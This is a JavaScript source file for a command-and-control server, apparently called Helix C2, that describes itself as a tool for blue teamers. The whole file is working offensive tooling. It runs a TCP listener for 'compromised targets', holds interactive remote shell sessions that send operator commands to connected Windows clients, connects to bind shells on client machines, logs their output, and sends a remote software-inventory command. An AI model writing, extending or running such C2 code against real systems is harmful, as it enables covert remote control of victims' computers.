const net = require("net");
const readline = require("readline");
const colors = require("colors");

let clients = {};
let clientIdCounter = 0;
let server = null;

const header = `
    
    _    _      _ _          _____ ___  
   | |  | |    | (_)        / ____|__ \\ 
   | |__| | ___| |___  __  | |       ) |
   |  __  |/ _ \\ | \\ \\/ /  | |      / / 
   | |  | |  __/ | |>  <   | |____ / /_ 
   |_|  |_|\\___|_|_/_/\\_\\   \\_____|____|

   - C2 server for blue teamers and network admins (for now)
   - Author: https://github.com/tr3sp4ss3rexe
   [!] The only payload currently available is a Windows GUI client for now.
   _______________________________________________________________`;

function printHeader() {
    console.clear();
    console.log(header.green);
}

function setupListener(port = 1337) {
    server = net.createServer((socket) => {
        const clientId = clientIdCounter++;
        const clientAddress = socket.remoteAddress.replace("::ffff:", "");
        const connectionTime = new Date();

        clients[clientId] = {
            socket: socket,
            clientAddress: clientAddress,
            connectionTime: connectionTime,
            data: "",
            interactiveMode: false
        };

        console.log(`Client ${clientId} connected from IP: ${clientAddress}`);

        socket.on("data", (data) => {
            const response = data.toString().trim();
            if (response.length > 0) {
                clients[clientId].data += response + "\n";
                // Output response if in interactive mode
                if (clients[clientId].interactiveMode) {
                    process.stdout.write(`${response}\n> `); // `\nClient ${clientId} response: ${response}\n> `
                }
            }
        });

        socket.on("end", () => {
            console.log(`Client ${clientId} disconnected.`);
            delete clients[clientId];
        });

        socket.on("error", (err) => {
            console.error(`Error with client ${clientId}: ${err.message}`);
        });
    });

    server.listen(port, () => {
        console.log(`TCP server is listening on port ${port}`);
    });
}

function killListener() {
    if (server) {
        server.close(() => {
            console.log("Listener stopped.");
        });
        server = null;
    } else {
        console.log("No listener to stop.");
    }
}

function listClients() {
    if (Object.keys(clients).length > 0) {
        console.log("Connected Clients:");
        Object.keys(clients).forEach(clientId => {
            console.log(`Client ${clientId} (${clients[clientId].clientAddress})`);
        });
    } else {
        console.log("No clients connected.");
    }
}

function getClientInfo(clientId) {
    if (clients[clientId]) {
        console.log(`Client ${clientId} connected from IP: ${clients[clientId].clientAddress}`);
        console.log(`Connection time: ${clients[clientId].connectionTime.toLocaleString()}`);
        console.log(`Data received from client ${clientId}: ${clients[clientId].data}`);
    } else {
        console.log("Invalid client ID.");
    }
}

function interactWithClient(clientId) {
    if (clients[clientId]) {
        console.log(`\nEntering interactive shell with client ${clientId}...`);
        clients[clientId].interactiveMode = true; // Set interactive mode

        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: "> "
        });

        rl.prompt();

        rl.on("line", (command) => {
            if (command.toLowerCase() === "exit") {
                clients[clientId].interactiveMode = false;
                console.log(`Exiting interaction with client ${clientId}...`);
                rl.close();
                displayMenu(); // Go back to menu after exiting
            } else {
                if (clients[clientId]) {
                    clients[clientId].socket.write(command + "\n"); // Send command to client
                } else {
                    console.log(`Client ${clientId} is no longer connected.`);
                }
                rl.prompt(); // Keep the prompt open for further commands
            }
        });

        rl.on("close", () => {
            clients[clientId].interactiveMode = false;
            displayMenu(); // Return to menu after closing
        });
    } else {
        console.log("Invalid client ID or client not connected.");
        displayMenu(); // Return to menu if invalid client ID
    }
}

function connectToBindShell(clientIP, port = 1338) {
    const socket = new net.Socket();

    socket.connect(port, clientIP, () => {
        console.log(`Connected to client"s bind shell at ${clientIP}:${port}`);
        const clientId = clientIdCounter++;
        const connectionTime = new Date();

        clients[clientId] = {
            socket: socket,
            clientAddress: clientIP,
            connectionTime: connectionTime,
            data: "",
            interactiveMode: false
        };

        // Define socket event handlers within the connect callback
        socket.on("data", (data) => {
            const response = data.toString().trim();
            if (response.length > 0) {
                clients[clientId].data += response + "\n";
                if (clients[clientId].interactiveMode) {
                    process.stdout.write(`\nClient ${clientId} response: ${response}\n> `);
                }
            }
        });

        socket.on("end", () => {
            console.log(`Client ${clientId} disconnected.`);
            delete clients[clientId];
        });

        socket.on("error", (err) => {
            console.error(`Error with client ${clientId}: ${err.message}`);
        });

        // Do not call displayMenu here; let the user decide next steps
    });

    socket.on("error", (err) => {
        console.error(`Error connecting to client"s bind shell: ${err.message}`);
    });
}


function removeClient(clientId) {
    if (clients[clientId]) {
        clients[clientId].socket.end(); // Gracefully close the socket
        delete clients[clientId];
        console.log(`Client ${clientId} has been removed.`);
    } else {
        console.log("Invalid client ID.");
    }
}

function displayMenu() {
    printHeader();
    if (global.rl && !global.rl.closed) {
        global.rl.close(); // Close existing readline interface if open
    }
    global.rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log(`
    Listener handling: `.green)
    console.log(`    1) Start listener on port 1337 (default)
    2) Kill listener`)
    console.log(`
    Target handling:`.green)    
    console.log(`    3) List compromised targets
    4) Interact with a target
    5) Show interaction logs
    6) Bind to client
    7) List running apps on a client
    8) Remove connected client`)
    console.log(`
    9) Exit\n`.red);

    global.rl.question("> ", (choice) => {
        switch (choice.trim()) {
            case "1":
                setupListener();
                waitForUserInput(rl);
                break;
            case "2":
                killListener();
                waitForUserInput(rl);
                break;
            case "3":
                listClients();
                waitForUserInput(rl);
                break;
            case "4":
                rl.question("Enter client ID to interact with: ", (clientId) => {
                    rl.close();
                    interactWithClient(clientId);
                });
                break;
            case "5":
                rl.question("Enter client ID to get interaction logs for: ", (clientId) => {
                    getClientInfo(clientId);
                    waitForUserInput(rl);
                });
                break;
            case "6":
                rl.question("Enter client IP to bind shell: ", (clientIP) => {
                    rl.close();
                    connectToBindShell(clientIP.trim());
                });
                break;
            case "7":
                rl.question("Enter client ID for installed application list: ", (clientId) => {
                    if (clients[clientId]) {
                        console.log(`Fetching installed applications list for Client ${clientId}...`);
                        
                        // Send the command to the client to list installed apps
                        clients[clientId].socket.write("wmic product get name\n");
                        
                        // Wait for the response and handle it
                        clients[clientId].interactiveMode = true; // Enable interactive mode to capture response
            
                        const waitForOutput = readline.createInterface({
                            input: process.stdin,
                            output: process.stdout
                        });
            
                        waitForOutput.question("\n", () => {
                            waitForOutput.close();
                            clients[clientId].interactiveMode = false; // Disable interactive mode
                            displayMenu(); // Return to the main menu
                        });

                    } else {
                        console.log("Invalid client ID or client not connected.");
                        waitForUserInput(rl);
                    }
                });
                break;
            case "8":
                rl.question("Enter client ID to remove: ", (clientId) => {
                    removeClient(clientId);
                    waitForUserInput(rl);
                });
                break;
            case "9":
                console.log("Exiting...");
                rl.close();
                if (server) server.close();
                process.exit(0);
                break;
            default:
                console.log("Invalid choice. Please try again.");
                waitForUserInput(rl);
                break;
        }
    });
}

function waitForUserInput(rl) {
    rl.question("\nPress enter to continue...", () => {
        rl.close();
        console.clear();
        displayMenu();
    });
}

displayMenu();
